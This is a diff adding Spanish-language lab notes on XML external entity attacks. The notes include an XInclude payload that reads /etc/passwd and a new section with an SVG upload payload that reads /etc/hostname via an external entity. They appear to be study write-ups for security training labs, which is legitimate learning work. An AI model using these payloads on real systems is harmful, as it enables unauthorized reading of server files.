@@ -291,7 +291,21 @@ productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="tex
 Entonces hacemos uso de xi definido como namespace en ""http://www.w3.org/2001/XInclude". Con lo cual nos regresa el contenido de passwd.  
       
       > https://www.sitepoint.com/xml-namespaces-explained/
-    
+      
+# Exploiting XXE via image file upload
+      
+En este lab nos damos cuenta que la imagen que se sube ne el avatar es SVG como este tipo de archivos
+al final son XML se puede inyectar como:
+      
+      ```
+      Content-Type: image/svg+xml
+      
+      <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+      
+      ```
+      
+      
+      
 ***Referencias***
 
 Validador de XML
